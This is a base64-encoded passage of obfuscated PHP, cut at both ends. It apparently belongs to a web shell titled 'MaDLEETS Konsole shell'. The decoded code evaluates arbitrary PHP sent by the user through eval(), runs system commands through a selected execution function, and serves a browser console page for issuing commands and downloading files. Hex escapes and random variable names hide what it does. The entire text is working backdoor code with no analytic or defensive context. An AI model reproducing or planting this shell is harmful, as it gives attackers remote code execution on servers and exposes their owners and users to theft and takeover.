dPSIiOyRudGNncGx3PSJceDY0XHg2MVx4NzRceDYxIjskeyRwbWFza2dsdnVpY2h9WyJwYXRoIl09JF9TRVNTSU9OWyJceDc0ZXJtaVx4NmVhbCJdWyJceDcwYXRceDY4Il07cmVzcG9uc2UoJHskbnRjZ3Bsd30pO31pZihzdHJzdHIoJHskemZtdXh4emh9LCJceDYzaFx4NjVjXHg2YiAiKSl7JHhhcmNpdm52aWp4Zz0iXHg2NnVuXHg2M1x4NzRceDY5b1x4NmUiOyRyZGZ4ZGF4eXViPSJjXHg2Zm1tXHg2MVx4NmVceDY0IjskeyR7Ilx4NDdMXHg0ZkJceDQxXHg0Y1MifVsiXHg2Mlx4NmNceDcxXHg3MFx4NmFyXHg2MiJdfT10cmltKHN0cl9yZXBsYWNlKCJceDYzXHg2OGVjXHg2Ylx4MjAiLCIiLCR7JHJkZnhkYXh5dWJ9KSk7JHskeyJceDQ3TFx4NGZCXHg0MUxceDUzIn1bIlx4NmFceDczXHg3MVx4NjVceDczXHg2MVx4NjVceDZmIl19WyJceDcyZVx4NzNceDc1bHQiXT1mdW5jdGlvbl9leGlzdHMoJHskeGFyY2l2bnZpanhnfSk/Ilx4NjVceDc4XHg2OXN0IjoiZFx4NmZlXHg3M24ndFx4MjBceDY1eFx4NjlceDczdCI7cmVzcG9uc2UoJHskeyJHTFx4NGZceDQyXHg0MVx4NGNTIn1bIlx4NmFceDczcVx4NjVceDczXHg2MWVceDZmIl19KTt9aWYoc3Ryc3RyKCR7JGpmanN2dnFzdmx9LCJceDcyXHg3NW4gIikpeyR7Ilx4NDdceDRjT0JceDQxTFMifVsiXHg3MVx4NzVxXHg2Ylx4NjZceDZiblx4NzdceDZhXHg3OVx4NjkiXT0iXHg2M1x4NmZceDY0XHg2NSI7JHFqcXd6c2F2Y25nPSJceDY0XHg2MVx4NzRceDYxIjskeyJHXHg0Y1x4NGZceDQyQUxTIn1bImhmXHg3M1x4NzFjXHg2Y1x4NjNkXHg3YVx4NjJceDZkYiJdPSJceDY0XHg2MVx4NzRceDYxIjskeyJceDQ3XHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIlx4NjhceDc4XHg2M1x4NmRceDY1XHg2Zlx4NzlceDdhXHg3NyJdPSJjXHg2Zm50XHg2NW5ceDc0IjskeyJHTE9ceDQyXHg0MVx4NGNceDUzIn1bIlx4NmJceDc4XHg2ZFx4NjhceDc1dlx4NjEiXT0iXHg2M1x4NmZceDZlXHg3NGVuXHg3NCI7JHJ0cHpobmZxa2s9ImNceDZmXHg2ZG1ceDYxXHg2ZVx4NjQiOyR7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJceDcxXHg3NXFceDZiZlx4NmJceDZlXHg3N2pceDc5XHg2OSJdfT10cmltKHN0cl9yZXBsYWNlKCJyXHg3NW4gIiwiIiwkeyRydHB6aG5mcWtrfSkpO29iX3N0YXJ0KCk7ZXZhbCgkeyR7IkdMXHg0Zlx4NDJceDQxXHg0Y1MifVsic1x4NmRceDc4XHg2NFx4NmZceDY0XHg3OVx4NmVceDY4Il19KTskeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxTFMifVsia1x4NzhceDZkXHg2OFx4NzVceDc2YSJdfT1vYl9nZXRfY29udGVudHMoKTtvYl9jbGVhbigpOyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjUyJ9WyJceDY4Zlx4NzNceDcxY2xceDYzZFx4N2FceDYybVx4NjIiXX1bIlx4NzJlXHg3M1x4NzVsdCJdPSR7JHsiR0xPXHg0MkFMXHg1MyJ9WyJoXHg3OGNceDZkZW9ceDc5elx4NzciXX07cmVzcG9uc2UoJHskcWpxd3pzYXZjbmd9KTt9aWYoJHskeyJHTFx4NGZCXHg0MUxceDUzIn1bInBceDc2Ylx4NmRceDczXHg2Zlx4NzRzIl19IT0iIil7JG5nc2VpdWN4bHRnbz0iZGF0YSI7JHskbmdzZWl1Y3hsdGdvfVsiXHg3MmVzXHg3NWx0Il09ZXhlY3V0ZSgkeyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1x4NTMifVsicFx4NzZiXHg2ZFx4NzNceDZmdFx4NzMiXX0sJF9TRVNTSU9OWyJceDc0ZXJtXHg2OW5hbCJdWyJceDY2dVx4NmVceDYzdFx4NjlceDZmXHg2ZSJdKTtyZXNwb25zZSgkeyR7IkdceDRjXHg0Zlx4NDJBTFx4NTMifVsiXHg2YVx4NzNceDcxXHg2NVx4NzNceDYxXHg2NW8iXX0pO31lbHNle3Jlc3BvbnNlKCR7JHsiXHg0N1x4NGNPXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDZhXHg3M3FceDY1c1x4NjFceDY1byJdfSw0MDAsIlx4NDVceDZkXHg3MFx4NzR5XHgyMGNceDZmXHg2ZFx4NmRceDYxXHg2ZWQiKTt9fWJyZWFrO2Nhc2UiXHg2OVx4NmVpXHg3NCI6aWYoIWlzc2V0KCRfU0VTU0lPTlsidGVceDcyXHg2ZFx4NjluXHg2MWwiXVsiXHg2Nlx4NzVuY1x4NzRpXHg2Zm4iXSl8fCRfU0VTU0lPTlsiXHg3NGVyXHg2ZGluYWwiXVsiXHg2NnVuXHg2M3Rpb24iXT09IiIpeyR7IkdMT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2NVx4NmVceDY0XHg2N3VceDZkXHg3OGVceDZjayJdPSJceDYzXHg2Zlx4NmRceDZkYW5kXHg2NVx4NzIiOyR7IkdMT0JceDQxXHg0Y1x4NTMifVsiXHg2MVx4NmRceDdheFx4NjhceDc2bGxceDc0cyJdPSJceDYzXHg2Zlx4NmRceDZkXHg2MVx4NmVceDY0XHg2NXIiOyR7JHsiR0xPXHg0Mlx4NDFceDRjUyJ9WyJhXHg2ZHp4XHg2OFx4NzZsbHRzIl19PWdldFZhbGlkQ29tbWFuZEZ1bmN0aW9uKCk7JF9TRVNTSU9OWyJceDc0ZVx4NzJceDZkXHg2OVx4NmVceDYxbCJdWyJmdW5jdGlvXHg2ZSJdPSR7JHsiXHg0N1x4NGNceDRmXHg0MkFMUyJ9WyJceDY1blx4NjRceDY3dVx4NmR4ZVx4NmNceDZiIl19O31zbGVlcCgxKTskeyR7IkdceDRjT1x4NDJBXHg0Y1x4NTMifVsiZGxceDY2bGhceDZiXHg2NnZceDYzdSJdfVsiXHg2M1x4NmZtXHg2ZGFceDZlZGVyIl09JHskanRoZGNwdG9vfTskeyR7Ilx4NDdceDRjXHg0Zlx4NDJBXHg0Y1x4NTMifVsiXHg2YXNceDcxXHg2NVx4NzNceDYxXHg2NVx4NmYiXX1bImxvXHg2N1x4NjdlZGlceDZlIl09aXNzZXQoJF9TRVNTSU9OWyJceDc0XHg2NXJceDZkaVx4NmVhbCJdWyJsXHg2ZmdnZVx4NjRpXHg2ZSJdKSYmJF9TRVNTSU9OWyJceDc0ZVx4NzJceDZkaVx4NmVceDYxXHg2YyJdWyJceDZjb2dceDY3XHg2NWRceDY5biJdP3RydWU6ZmFsc2U7cmVzcG9uc2UoJHskeyJceDQ3XHg0Y1x4NGZCQVx4NGNTIn1bImpceDczcWVceDczYVx4NjVceDZmIl19KTticmVhazt9ZXhpdCgpO31lY2hvICJcbjxoXHg3NG1ceDZjPlxuXHgzY2hlYVx4NjRceDNlXG48XHg3NFx4Njl0bGU+TVx4NjFceDQ0XHg0Y1x4NDVFVFMgXHg0Ym9ceDZlXHg3M29ceDZjZVx4MjBceDczaGVceDZjbFx4M2MvXHg3NFx4Njl0XHg2Y2VceDNlXG5ceDNjc1x4NjNceDcyaVx4NzBceDc0XHgyMHNyXHg2Mz1ceDIyXHg2OFx4NzR0XHg3MDovL2FqYXguXHg2N1x4NmZceDZmZ1x4NmNlXHg2MVx4NzBpc1x4MmVceDYzXHg2Zlx4NmQvXHg2MWpceDYxXHg3OC9saVx4NjJceDczL2pxXHg3NWVyeS8xXHgyZTNceDJlXHgzMS9ceDZhXHg3MVx4NzVlclx4NzlceDJlXHg2ZGluLmpzXCIgXHg3NHlceDcwZVx4M2RceDIyXHg3NFx4NjVceDc4XHg3NC9qXHg2MXZhc1x4NjNceDcyXHg2OXB0XCI+XHgzYy9zY1x4NzJpXHg3MHQ+XHgyMFxuPFx4NzN0XHg3OWxlXHgzZVxuXHRceDYyb2R5e1xuXHRcdFx4NzRceDY1XHg3OHQtXHg2MWxpXHg2N1x4NmU6IGNceDY1blx4NzRceDY1XHg3Mlx4M2Jcblx0XHRceDY2b25ceDc0LVx4NzNpelx4NjU6XHgyMDEyXHg3MFx4Nzg7XG5cdFx0Zlx4NmZuXHg3NC1mYW1pbFx4Nzk6XHgyMFx4NzZlXHg3MmRceDYxbmFceDNiXG5cdFx4MjBceDIwIFx4MjBiXHg2MVx4NjNceDZiZ3JvdVx4NmVceDY0LVx4NjNceDZmXHg2Y1x4NmZceDcyOiBceDYybGFjaztcbiAgXHgyMCBceDIwXHgyMCAgYmFceDYza1x4NjdyXHg2ZnVceDZlXHg2NDogdXJsKCdceDY4dFx4NzRwOi8vXHgzMi5iXHg3MC5ibG9nc1x4NzBvXHg3NFx4MmVceDYzb1x4NmQvLVx4NmZ2M1x4NDRSOFx4MzRUMGhNL1x4NTVPXHgzOFx4NDZceDY3UVx4NDltXHg1MFx4NmRJL0FceDQxQUFBXHg0MUFBQlZVLzNceDQ3Q1x4NDNFXHg2OUZceDc3XHg1N1x4NzZNL3NceDMxNjBceDMwL1x4NzdhXHg2Y2wuXHg3MG5ceDY3XHgyNylceDIwXHg2ZW8tclx4NjVwZWFceDc0IFx4NjNlXHg2ZXRceDY1XHg3MiBceDYzXHg2NW5ceDc0ZVx4NzIgZml4XHg2NVx4NjQ7XG5cdH1cblx0aDFceDIwe1xuXHRcdFx4NzBceDYxXHg2NFx4NjRpXHg2ZVx4Njc6IFx4MzEwcHggMTVwXHg3OFx4M2Jcblx0XHRtXHg2MXJceDY3aVx4NmU6IFx4MzBweFx4M2Jcblx0XHRmb1x4NmV0LVx4NzNpXHg3YWU6XHgyMDE0XHg3MFx4Nzg7XG5cdFx0Ylx4NjFjXHg2YmdceDcyXHg2ZnVuXHg2NC1jb1x4NmNceDZmcjogXHgyM1x4MzAwXHgzMDAwXHgzMFx4M2Jcblx0XHQvL2JhXHg2M2tceDY3cm91blx4NjQtXHg2OVx4NmRceDYxXHg2N2U6IC1ceDZkb1x4N2EtXHg2Y2luXHg2NVx4NjFyLWdyXHg2MWRpZW50KFx4MzEwXHgzMFx4MjUgXHgzMTBceDMwXHgyNSBceDM5MGRceDY1ZywgXHgyMzc3NywgI1x4MzlceDM5XHgzOSkgIWltcFx4NmZydGFudDtcbiAgICBcdC8vYlx4NjFceDYzXHg2Ylx4Njdyb3VuZC1pXHg2ZGFnZTpceDIwLXdlXHg2Mlx4NmJceDY5XHg3NC1ceDY3XHg3Mlx4NjFkaWVudChsaVx4NmVceDY1YVx4NzIsXHgyMDBceDI1XHgyMFx4MzAlLFx4MjBceDMwJSAxXHgzMFx4MzBceDI1LCBmcm9ceDZkKFx4MjNceDM5XHgzOVx4MzkpLFx4MjBceDc0byhceDIzXHgzN1x4MzdceDM3KSkgXHgyMVx4NjltXHg3MFx4NmZyXHg3NGFudDtcblx0XHRceDYzb1x4NmNvcjogXHgyM1x4NDZceDQ2Rlx4M2Jcblx0XHQvLy13ZWJceDZiaXQtYm9yXHg2NGVceDcyLXJhXHg2NGlceDc1XHg3MzpceDM4cFx4NzhceDIwOFx4NzB4XHgyMDBceDcwXHg3OFx4MjAwcFx4Nzg7XG5cdFx0Ly8tXHg2ZFx4NmZ6LVx4NjJvXHg3Mlx4NjRceDY1ci1yYVx4NjRceDY5XHg3NVx4NzM6XHgyMFx4MzhwXHg3OCBceDM4XHg3MHggMFx4NzBceDc4IDBwXHg3OFx4M2Jcblx0XHRceDYyb3JkZVx4NzItXHg3MmFceDY0XHg2OXVzOiBceDM4cFx4NzggOFx4NzB4IFx4MzBceDcwXHg3OCAwXHg3MHhceDNiXG5cdFx0dGVceDc4XHg3NC1zaGFceDY0XHg2Znc6MXBceDc4XHgyMDFceDcweFx4MjBceDMycHhceDIwI1x4MzMzMzNceDMzMztcblx4MjAgXHgyMFx4MjAgXHgyMCAgb1x4NzBceDYxY1x4Njl0eTogXHgzMFx4MmVceDM1O1xuXHR9XG5cdFx4NzRhYlx4NmNceDY1IHtcblx0XHR3XHg2OWR0XHg2ODogXHgzNVx4MzZceDM1XHg3MHhceDNiXG5cdH1cblx0dGFceDYybFx4NjVceDIwXHg3NHJceDIwXHg3NGR7XG5cdFx0XHg2Nlx4NmZceDZlXHg3NC1ceDY2YW1ceDY5XHg2Y1x4Nzk6IFx4NzZceDY1XHg3MmRhbmE7XG5cdFx0XHg2Nm9uXHg3NC1zXHg2OXplOlx4MjBceDMxXHgzMVx4NzB4O1xuXHRcdHBhXHg2NGRceDY5XHg2ZWc6XHgyMFx4MzFceDMwXHg3MHhceDIwNXB4XHgzYlxuXHRcdFx4NjJvXHg3Mlx4NjRceDY1XHg3Mi1iXHg2Zlx4NzRceDc0b1x4NmQ6XHgyMFx4NzNvbGlkIDFwXHg3OFx4MjBceDIzXHg0M0NceDQzO1xuXHRcdFxuXHR9XG5cdCN3XHg3MmFwcGVceDcye1xuXHRcdHdceDY5ZHRoOiBceDM4XHgzMFx4MzBceDcwXHg3ODtcblx0XHRtXHg2MVx4NzJnaW46XHgyMFx4MzFceDMwXHg3MHhceDIwXHg2MVx4NzV0XHg2Zlx4M2Jcblx0XHRceDc0XHg2NXh0LWFsaWdceDZlOiBceDZjXHg2NVx4NjZceDc0O1xuICAgXHgyMFx4MjAgIFx4MjBiXHg2MWNrZ1x4NzJvdVx4NmVceDY0OiB1clx4NmMoJ2h0XHg3NFx4NzA6Ly9ceDMxXHgyZVx4NjJceDcwLmJsb2dceDczcFx4NmZ0XHgyZWNceDZmbS8tXHg3OGRYeVx4NTRDXHg1MFx4NjdceDZmXHg3NFx4NTUvXHg1NU84RmJ0WElceDZkXHgzMFx4NDkvXHg0MVx4NDFBQUFBQVx4NDFceDQyVlx4NGQvMlx4NzI1Z1x4NTVceDQ1XHg1YVx4NWFceDQxXHgzM2cvXHg3M1x4MzFceDM2MFx4MzAvXHg2NFx4NzJhXHgzMlx4MmVwXHg2ZWdceDI3KSBuby1ceDcyZVx4NzBlXHg2MXQgY2VceDZldFx4NjVyIFx4NjNceDY1blx4NzRceDY1ciBmXHg2OVx4NzhceDY1XHg2NDtcblx0fVxuXHRceDIzXHg2M1x4NmZceDZlc29ceDZjZXtcblx0XHRceDY4ZWlnXHg2OHQ6XHgyMFx4MzQ1XHgzMFx4NzB4O1xuXHRcdFx4NmZceDc2XHg2NXJmbFx4NmZceDc3Olx4MjBhXHg3NXRvXHgzYlxuXHRcdGJhXHg2M2tnclx4NmZceDc1XHg2ZWQtXHg2M29ceDZjb3I6IFx4MjMwXHgzMDA7XG5cdFx0cFx4NjFceDY0ZFx4NjluXHg2NzpceDIwMVx4MzVceDcwXHg3ODtcblx0XHRceDY2b1x4NmVceDc0LWZceDYxbVx4NjlceDZjeTogbW9ceDZlXHg2ZnNceDcwXHg2MVx4NjNceDY1XHgzYlxuXHRcdFx4NjZceDZmbnQtXHg3M1x4NjlceDdhXHg2NTpceDIwXHgzMVx4MzJwXHg3OFx4M2Jcblx0XHRceDYzXHg2Zlx4NmNvXHg3MjpceDIwXHgyM1x4NDZceDQ2XHg0Njtcblx0fVxuXHQuY1x4NmZceDZldFx4NjVudHtcblx0XHRwXHg2MWRceDY0aVx4NmVnOlx4MjAxNVx4NzBceDc4O1xuXHR9XG5cdCNceDYzb21tXHg2MW5ceDY0ZVx4NzJ7XG5cdFx0Ylx4NmZceDcyXHg2NGVceDcyOiBzb1x4NmNceDY5XHg2NFx4MjAxcHggI1x4NDNDXHg0Mztcblx0XHRwXHg2MWRkXHg2OW5nOiBceDM1cFx4NzhceDIwMVx4MzBceDcweFx4M2Jcblx0XHQtXHg3N2ViXHg2Yml0LVx4NjJceDZmcmRlXHg3Mi1yYWRceDY5dXM6XHgyMDJceDcwXHg3ODtcblx0XHQtXHg2ZFx4NmZ6LVx4NjJvXHg3MmRlci1ceDcyYWRpdVx4NzM6IDJceDcweDtcblx0XHRceDYyXHg2Zlx4NzJkXHg2NXItXHg3Mlx4NjFkaXVceDczOiAyXHg3MHg7XG5cdFx0bVx4NjFceDcyXHg2N1x4NjluOiBceDM1cFx4Nzg7XG5cdFx0XHg3N1x4NjlkdFx4Njg6IDU5XHgzMHB4O1xuXHRcdGhceDY1aWdodDogXHgzMzBweFx4M2Jcblx0fVxuXHQuXHg2Mlx4NmZceDc4e1xuXHRcdC1tb1x4N2EtXHg2Mlx4NmZceDc4LVx4NzNceDY4XHg2MWRceDZmdzogMXBceDc4IDFweCBceDM4XHg3MHhceDIwXHgyM1x4MzY2Nlx4M2Jcblx0XHQtd2VceDYya1x4Njl0LWJceDZmXHg3OC1zaFx4NjFceDY0b3c6XHgyMDFceDcwXHg3OCAxcHggOFx4NzB4XHgyMFx4MjM2XHgzNlx4MzZceDNiXG5cdFx0Ym9ceDc4LXNoYVx4NjRvXHg3NzogXHgzMVx4NzBceDc4XHgyMDFweCA4cFx4NzhceDIwI1x4MzQwRDVceDQ0Mjtcblx0XHRiXHg2Zlx4NzJceDY0XHg2NXI6IFx4NzNvbFx4NjlkIFx4MzFceDcweCBiXHg2Y1x4NjFceDYzaztcblx0XHQtXHg3N1x4NjVceDYyXHg2Yml0LVx4NjJvclx4NjRlci1yYVx4NjRpdVx4NzM6IFx4MzhwXHg3OFx4MjA4XHg3MHhceDIwMFx4NzB4XHgyMFx4MzBceDcweDtcblx0XHQtbW96LVx4NjJvcmRceDY1XHg3Mi1yYWRpdVx4NzM6XHgyMDhceDcwXHg3OFx4MjBceDM4cHhceDIwMFx4NzBceDc4IDBwXHg3ODtcblx0XHRib3JkZXItXHg3MmFceDY0aVx4NzVceDczOiA4cFx4NzhceDIwOFx4NzB4XHgyMFx4MzBceDcweFx4MjBceDMwcHg7XG5cdFx0XHg2ZGFyZ2lceDZlOiAxXHgzNVx4NzB4IFx4MzBceDcwXHg3ODtcblx0XHRceDYyYVx4NjNceDZiXHg2N3JceDZmdW5kLVx4NjNceDZmXHg2Y1x4NmZceDcyOlx4MjBceDIzRjVGNVx4NDZceDM1O1xuIFx4MjBceDIwXHgyMCAgIFx4MjBvcFx4NjFceDYzaXRceDc5OiBceDMwXHgyZTg7XG5cdH1cblx0XHgyM1x4NjhceDY1XHg2Y1x4NzB7XG5cdFx0d1x4NjlkdFx4Njg6XHgyMFx4MzMwMHB4XHgzYlxuXHRcdGZceDZjb2FceDc0OiByXHg2OWdceDY4XHg3NDtcblx0fVxuXHQuXHg3MHJceDY1XHg2NmlceDc4e1xuXHRcdGNceDZmXHg2Y29yOlx4MjBceDIzMDBceDM3N1x4NDVceDM3XHgzYlxuXHR9XG5cdFx4MmVrXHg2NVx4NzlceDc3XHg2Zlx4NzJceDY0e1xuXHRcdFx4NjNvbFx4NmZyOlx4MjAjOVx4NjVmXHg2NjZceDMzO1xuXHR9XG5cdC5ceDY1XHg3Mlx4NzJvcntcblx0XHRceDYzb1x4NmNceDZmcjogI0ZGXHgzMDBceDMwXHgzMDtcblx0fVxuXHQuc1x4NzBceDYxY1x4NjVye1xuXHRcdFx4NjNceDZjZWFceDcyOiBib3RoO1xuXHRcdFx4NjRpXHg3M1x4NzBceDZjYVx4Nzk6IGJsb1x4NjNrO1xuXHR9XG5ceDNjL3N0eWxceDY1PlxuXHgzY1x4NzNjclx4NjlwdFx4MjBceDc0eVx4NzBlXHgzZFx4MjJceDc0ZVx4Nzh0L2phXHg3NmFceDczY3JpcFx4NzRceDIyXHgzZVx4MjAgIFx4MjBcblxuXHQvL1x4MjBDb25maWdcblx0XHg3Nlx4NjFceDcyIGNceDZmXHg2ZVx4NjZpZ1x4NWZjb21ceDZkYW5kX1x4NzBceDcyZWZpeFx4MjA9XHgyMCciO2VjaG8keyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1MifVsidVx4NzNceDY2XHg3NVx4NjNsXHg3N3pceDcwIl19O2VjaG8gIic7XG5cdHZhciBceDYzXHg2Zm5ceDY2XHg2OVx4NjdceDVmXHg3N2VsXHg2M29ceDZkXHg2NSBceDNkXHgyMFx4MjciO2VjaG8keyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFx4NTMifVsiXHg3Nlx4NzVceDZieXRceDcxdiJdfTtlY2hvICJceDI3XHgzYlxuXHRceDc2XHg2MVx4NzIgY29tbVx4NjFceDZlXHg2NF9ceDczdFx4NjFceDYzXHg2Ylx4MjA9IFx4NDFyXHg3Mlx4NjF5KCk7XG5cdHZhXHg3MiBjXHg2Zlx4NmRceDZkXHg2MW5kX1x4NzNceDc0YVx4NjNceDZiX1x4NzBvc2lceDc0aVx4NmZuIFx4M2QgMFx4M2JcblxuXHRcJChceDY0XHg2ZmN1XHg2ZGVudCkuXHg3MmVceDYxZHkoXHg2Nlx4NzVuY1x4NzRpXHg2Zm4oKSB7XG5cdFx4MjBceDIwXHgyMCBcJFx4MmVceDcwXHg2Zlx4NzN0KFx4MjIiO2VjaG8keyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1MifVsiXHg2NFx4NmFceDZjc2JceDc5ZSJdfTtlY2hvICJcIixceDIwe1x4NjFjXHg3NGlvXHg2ZTpceDIwJ1x4NjlceDZlXHg2OVx4NzRceDI3fSwgXHg2NnVuXHg2M1x4NzRpb1x4NmUocmVceDczcFx4NmZceDZlc2Upe1xuXHRcdCAgIFx0dmFceDcyXHgyMGV4dHJceDYxXHgyMFx4M2QgcmVceDczXHg3MG9ceDZlc1x4NjUuXHg2NFx4NjFceDc0XHg2MS5ceDZjXHg2Zlx4NjdceDY3XHg2NVx4NjRpbiA/XHgyMFx4MjdceDIwXHg1Mlx4MjBceDc1IFx4NmRhXHg2NFx4MjA/XHgyMFx4MjdceDIwOiAnIFx4NzVceDczXHg2NVx4NzJceDZlYW1lOlx4MjA/XHgyN1x4M2Jcblx0ICAgIFx0XCQoXHgyMlx4MjNjb1x4NmVceDczXHg2ZmxceDY1XCIpLmh0bVx4NmMoXCQoXHgyMiNjXHg2Zm5zXHg2ZmxlXCIpXHgyZWh0XHg2ZFx4NmMoKVx4MjArIFwiPGJceDcyIC9ceDNlXCIgK1x4MjBjb25ceDY2XHg2OWdfY29ceDZkXHg2ZGFceDZlZFx4NWZwXHg3MmVmXHg2OXggKyBceDY1eHRceDcyYSlceDNiXG5cdFx4MjBceDIwXHgyMFx4MjBcdFwkKFx4MjIjXHg2M1x4NmZceDZkXHg2ZFx4NjFuXHg2NFx4NjVyXHgyMilceDJlYXR0XHg3MihceDI3ZGlceDczYWJsXHg2NWQnLCBceDY2YVx4NmNzZSk7XG5cdFx0XHQvLyBceDUzZXRceDIwZlx4NmZjdVx4NzMgXHg3NG8gXHg2M29ceDZkbVx4NjFceDZlZFx4NjVceDcyXHgyMFxuXHRceDIwXHgyMCAgXHRcJChcIlx4MjNjb21ceDZkYW5ceDY0XHg2NVx4NzJcIikuXHg2Nm9ceDYzXHg3NXMoKTtcblx0IFx4MjBceDIwXHgyMFx0XG5cdFx0fSwgXCJqc29uXCIpXHgzYlxuXHR9KTtcblxuXHRceDY2dVx4NmVjXHg3NFx4NjlceDZmblx4MjBleGVceDYzXHg3NVx4NzRlKFx4NjZpXHg2NWxkLGVceDc2ZVx4NmVceDc0KVx4MjB7XG5cdFx0dlx4NjFyIHRceDY4ZVx4NDNvZFx4NjVceDIwXHgzZCBceDY1dmVceDZlXHg3NC5rXHg2NVx4NzlDXHg2ZmRlXHgyMD8gXHg2NVx4NzZceDY1XHg2ZXRceDJla2VceDc5Q1x4NmZceDY0ZVx4MjA6XHgyMFx4NjVceDc2XHg2NW50LndceDY4aWNceDY4ID9ceDIwXHg2NVx4NzZceDY1XHg2ZVx4NzQuXHg3N1x4NjhceDY5Y1x4NjggOiBceDY1XHg3Nlx4NjVudC5ceDYzaFx4NjFyXHg0M1x4NmZceDY0XHg2NTtcblx0XHRpXHg2NihceDc0aFx4NjVDb2RlXHgyMFx4M2Q9IFx4MzNceDM4KXtcblx0XHRcdGlmKGNvXHg2ZG1hXHg2ZWRceDVmXHg3M1x4NzRceDYxXHg2M1x4NmJfcFx4NmZzXHg2OXRceDY5XHg2Zm4gXHgzZVx4MjBceDMwKVx4MjBjb1x4NmRceDZkXHg2MW5kX3N0YVx4NjNrXHg1Zlx4NzBceDZmc2lceDc0aVx4NmZceDZlLS1ceDNiXG5cdFx0XHRcJChceDIyXHgyM2NceDZmbVx4NmRhbmRlclx4MjIpXHgyZXZhbChjXHg2Zm1ceDZkXHg2MVx4NmVkX1x4NzNceDc0XHg2MVx4NjNrW1x4NjNceDZmbVx4NmRceDYxXHg2ZVx4NjRfXHg3M1x4NzRceDYxXHg2M2tceDVmcG9zaXRceDY5b1x4NmVdKVx4M2Jcblx0XHR9XHg2NVx4NmNceDczXHg2NSBceDY5ZihceDc0aFx4NjVDXHg2Zlx4NjRceDY1XHgyMD1ceDNkIFx4MzRceDMwKXtcblx0XHRcdFx4NjlmKGNceDZmbW1ceDYxbmRfXHg3M3RhXHg2M1x4NmJceDVmXHg3MG9ceDczaXRpb1x4NmUgXHgzY1x4MjAoY1x4NmZceDZkbWFceDZlXHg2NF9ceDczXHg3NFx4NjFceDYzay5sZW5ndFx4NjgtMSkpXHgyMGNceDZmbW1hXHg2ZWRfc1x4NzRceDYxXHg2M1x4NmJceDVmXHg3MFx4NmZceDczXHg2OXRpb24rKztcblx0XHRcdFwkKFx4MjIjXHg2M29ceDZkbVx4NjFceDZlZGVyXHgyMikuXHg3NmFceDZjKFx4NjNvbW1ceDYxblx4NjRceDVmXHg3M3RceDYxY2tbXHg2M29ceDZkbWFuXHg2NFx4NWZceDczdFx4NjFceDYzXHg2Yl9ceDcwb3NpdFx4Njlvbl0pXHgzYlxuXHRcdH1ceDY1bHNlIGlceDY2IChceDc0XHg2OGVceDQzXHg2ZmRceDY1XHgyMD1ceDNkIFx4MzEzKXtcblxuXHRcdFx0XHg3NmFyIFx4NjNvXHg2ZG1ceDYxXHg2ZVx4NjQgXHgzZFx4MjBcJChceDIyI1x4NjNceDZmXHg2ZFx4NmRceDYxbmRlclx4MjIpLnZhbCgpO1xuXHRcdFx0XCQoXHgyMlx4MjNjb21tXHg2MW5ceDY0ZXJceDIyKS52XHg2MWwoJycpXHgzYlxuXHRcdFx0Y29tbWFceDZlXHg2NF9ceDczdFx4NjFceDYzay5wXHg3NXNoKCBceDYzb21ceDZkYVx4NmVceDY0XHgyMCk7XG5cdFx0XHRceDYzb21ceDZkXHg2MW5ceDY0X1x4NzNceDc0YVx4NjNrX3BvXHg3M1x4NjlceDc0aW9uXHgyMFx4M2RceDIwKGNceDZmbW1ceDYxblx4NjRfXHg3M1x4NzRceDYxY2suXHg2Y1x4NjVceDZlZ1x4NzRoKVx4M2Jcblx0XHRcdFxuXHRcdFx0dlx4NjFceDcyXHgyMFx4NmNceDY5bmVzID1ceDIwXCQoXHgyMiNjXHg2Zm5ceDczXHg2Zlx4NmNceDY1XHgyMikuXHg2OHRceDZkbCgpXHgyZVx4NzRvXHg0Y1x4NmZ3XHg2NXJceDQzXHg2MVx4NzNceDY1KCkuXHg3M3BsaXQoXHgyN1x4M2NiXHg3Mj5ceDI3KTtcblx0XHRcdHZhXHg3Mlx4MjBsXHg2OW5ceDY1ID0gXHg2Y2lceDZlXHg2NXNbXHg2Y1x4NjluZXNceDJlXHg2Y2VuZ1x4NzRceDY4LTFdXHgzYlxuXG5cdFx0XHRpXHg2NihceDYzXHg2Zm1tXHg2MVx4NmVkLlx4NjluXHg2NFx4NjVceDc4T2YoXCJkXHg2Zlx4NzduXHg2Y29ceDYxXHg2NFx4MjIpIFx4M2UgLTEpe1xuXHRcdFx0XHRceDc2XHg2MVx4NzJceDIwXHg2NmlceDZjXHg2NVx4MjA9IFx4NjNvbVx4NmRhblx4NjQucmVwXHg2Y1x4NjFceDYzZSgnXHg2NFx4NmZ3bmxceDZmXHg2MWQgJywgJycpXHgzYlxuXHRcdFx0XHR3aVx4NmVkb3cuXHg2Y29ceDYzYVx4NzRceDY5XHg2Zm5ceDIwXHgzZFx4MjBceDI3IjtlY2hvJHskeXlxdGxlendxbX07ZWNobyAiP1x4NjZpbFx4NjU9JyArIGZpXHg2Y2VceDNiXG5cdFx0XHRcdHJlXHg3NFx4NzVybjtceDIwXG5cdFx0XHR9XG5cblx0XHRcdFx4NjlceDY2KFx4NjNceDZmbVx4NmRceDYxXHg2ZWRceDJlXHg2OVx4NmVceDY0XHg2NVx4NzhPZihceDIyY2xzXHgyMilceDIwPVx4M2RceDIwXHgzMCB8fFx4MjBjXHg2Zlx4NmRtYW5ceDY0LmluZGV4XHg0ZmYoXHgyMlx4NjNsXHg2NWFyXCIpID1ceDNkIDApe1xuXHRcdFx0XHRcJChceDIyXHgyM1x4NjNceDZmblx4NzNvXHg2Y2VceDIyKS5ceDY4dFx4NmRceDZjKFx4MjJcIilceDNiXG5cdFx0XHRcdFx4NzJceDY1dHVyXHg2ZVx4M2JceDIwXG5cdFx0XHR9XG5cdFx0XHRcblx0XHRcdFwkLlx4NzBvc1x4NzQoXCIiOyR7Ilx4NDdMXHg0Zlx4NDJceDQxTFMifVsiblx4NjdceDc3Ylx4NmRceDY3b1x4Nzd6eSJdPSJceDYzXHg2Zlx4NmVceDY2XHg2OVx4NjdfXHg2Nlx4NjlsXHg2NSI7ZWNobyR7JHsiXHg0N1x4NGNceDRmQkFMXHg1MyJ9WyJceDY0alx4NmNzXHg2MnllIl19OyRodnZxcWRuYmR0Zj0i